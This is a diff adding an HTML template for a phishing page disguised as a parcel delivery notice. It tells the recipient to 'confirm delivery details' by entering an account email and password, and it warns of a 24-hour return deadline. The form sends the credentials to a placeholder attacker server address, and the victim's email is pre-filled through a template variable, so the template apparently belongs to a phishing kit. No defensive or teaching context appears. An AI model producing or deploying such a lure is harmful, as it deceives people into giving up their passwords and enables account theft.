@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Package Delivery Update</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f8f9fa; }
+        .header { background: #ff5a00; color: white; padding: 20px; }
+        .content { 
+            background: white; width: 600px; margin: 20px auto;
+            padding: 30px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .tracking-number { color: #007bff; font-weight: bold; }
+        input { width: 100%; padding: 10px; margin: 10px 0; }
+        .confirm-btn { background: #28a745; color: white; padding: 12px; width: 100%; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h2>Delivery Action Required</h2>
+    </div>
+    <div class="content">
+        <p>Dear Customer,</p>
+        <p>Your package requires address confirmation.</p>
+        <form method="POST" action="{{server_ip}}/submit">
+            <input type="hidden" name="email" value="{{email}}">
+            <input type="text" name="username" placeholder="Account Email" required>
+            <input type="password" name="password" placeholder="Account Password" required>
+            <button type="submit" class="confirm-btn">Confirm Delivery Details</button>
+        </form>
+        <p style="color: #666; font-size: 0.9em;">
+            Package will be returned if not confirmed within 24 hours
+        </p>
+    </div>
+</body>
+</html>
